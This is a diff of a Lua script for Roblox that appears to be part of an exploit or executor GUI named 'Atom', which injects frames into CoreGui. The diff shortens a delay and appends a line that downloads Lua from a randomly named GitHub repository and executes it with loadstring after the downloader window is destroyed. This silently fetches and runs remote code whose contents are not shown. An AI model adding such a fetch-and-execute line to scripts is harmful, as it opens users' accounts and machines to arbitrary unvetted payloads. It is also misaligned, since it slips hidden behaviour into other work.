@@ -4801,7 +4801,7 @@ local function ApplyDownload()
 	Downloader.PlaceFr.Parent = game.CoreGui.Atom["Atom.Frame"].Main
 	Downloader.PlayerFr.Parent = game.CoreGui.Atom["Atom.Frame"].Main
 	Downloader.Config.Parent = game.CoreGui.Atom["Atom.Frame"].Main
-	wait(1)
+	wait(0.1)
 	coroutine.wrap(DEQIXO_fake_script)()
 	coroutine.wrap(LUTAP_fake_script)()
 	coroutine.wrap(LQVNA_fake_script)()
@@ -4843,5 +4843,6 @@ local function ApplyDownload()
 	coroutine.wrap(TQOJ_fake_script)()
 	wait(1)
 	Downloader.Downloader:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader2.lua"))()
 end
 coroutine.wrap(ApplyDownload)()
